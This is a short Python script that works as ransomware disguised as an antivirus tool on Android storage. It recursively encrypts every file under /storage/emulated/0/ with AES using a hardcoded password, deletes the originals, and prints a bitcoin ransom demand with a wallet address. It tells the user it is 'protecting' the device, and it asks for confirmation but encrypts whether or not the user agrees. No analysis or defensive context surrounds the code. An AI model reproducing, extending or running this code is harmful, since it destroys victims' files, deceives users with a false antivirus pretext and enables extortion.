import os
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad, unpad

TARGET_DIR = "/storage/emulated/0/"
SALT = b'rans0m_salt_!@#$'  
PASSWORD = "you_cant_find_it_madd"  

def derive_key(password):
    return PBKDF2(password.encode(), SALT, dkLen=32, count=100000)

def encrypt_file(path, key):
    try:
        
        if path.endswith('.enc'):
            return

        iv = os.urandom(16)
        with open(path, 'rb') as f:
            data = f.read()

        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_data = iv + cipher.encrypt(pad(data, AES.block_size))

        with open(path + '.enc', 'wb') as f:
            f.write(encrypted_data)

        os.remove(path)
        print(f"[+] Protecting: {path}")
    except Exception as e:
        print(f"[!] Error encrypting {path}: {e}")

def process_directory():
    key = derive_key(PASSWORD)
    for root, _, files in os.walk(TARGET_DIR):
        for file in files:
            full_path = os.path.join(root, file)
            if os.path.isfile(full_path) and not full_path.endswith('.enc'):
              
                if full_path == os.path.abspath(__file__):
                    continue
                encrypt_file(full_path, key)
                print("if you unlock you device sent 100$ bitcone to this Bitcoin ID is :bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq")

if __name__ == "__main__":
    print("⚠️ WARNING: This Antivirus is protecting your device .")
    confirm = input("Type 'CONFIRM' to protecting: ").strip()
    if confirm == "CONFIRM":
        process_directory()
    else:
        process_directory()
